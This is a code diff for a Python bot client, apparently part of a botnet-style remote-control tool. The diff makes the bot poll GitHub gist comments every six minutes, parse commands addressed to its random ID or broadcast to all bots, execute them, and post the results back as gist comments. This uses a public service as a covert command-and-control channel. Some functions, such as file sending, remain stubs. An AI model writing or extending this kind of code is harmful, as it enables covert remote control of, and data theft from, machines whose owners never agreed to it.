@@ -6,8 +6,9 @@ from utils import Command
 
 REFRESH_DELAY = 360  # 6 minutes
 
-ID = 0
+BOT_ID = 0
 LOG = []
+LAST_COMMENT = 0
 
 
 def error(cmd, data, r):
@@ -15,8 +16,8 @@ def error(cmd, data, r):
 
 
 def handle_command(cmd, data, r):
-    if cmd == Command.NONE:
-        return
+    if cmd == Command.HEARTBEAT:
+        out = ""
 
     elif cmd == Command.CMD:
         if (data == None):
@@ -31,31 +32,52 @@ def handle_command(cmd, data, r):
             out = send_file(data)
 
     LOG.append(out)
-    if r: respond(out)
+    if r: return respond(out)
+    return out
 
 
-def respond(msg):
-    # Send ID
-    # TODO
-    return
+def respond(data):
+    comment = parse_response(data)
+    return utils.post_gist_comment(comment)
+
+
+# TODO rework
+def parse_response(data):
+    return str(BOT_ID) + '\n' + data
+
+
+# TODO rework
+# TODO check if parsable
+def parse_command(comment):
+    bot, cmd, d, r = comment.split('\n')[:4]
+    bot = int(bot)
+    cmd = Command[cmd]
+    r = bool(int(r))
+    return bot, cmd, d, r
 
 
 def check_for_commands():
-    # Check ID
-    # TODO
-    return Command.CMD, ["param", "param"], False
+    global LAST_COMMENT
+    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
+    
+    handled = 0
+    for comment in data:
+        bot, cmd, d, r = parse_command(comment['body'])
+        if bot == utils.BROADCAST or bot == BOT_ID:
+            handle_command(cmd, d, r)
+            handled += 1
+    return handled
 
 
 def send_file():
     # TODO
-    return ""
+    return None
 
 
 if __name__ == "__main__":
-    ID = random.randint(1, sys.maxsize)
+    BOT_ID = random.randint(1, sys.maxsize)
     utils.init_config()
 
     while True:
-        time.sleep(SLEEP)
-        cmd, data, r = check_for_commands()
-        handle_command(cmd, data, r)
+        time.sleep(REFRESH_DELAY)
+        check_for_commands()
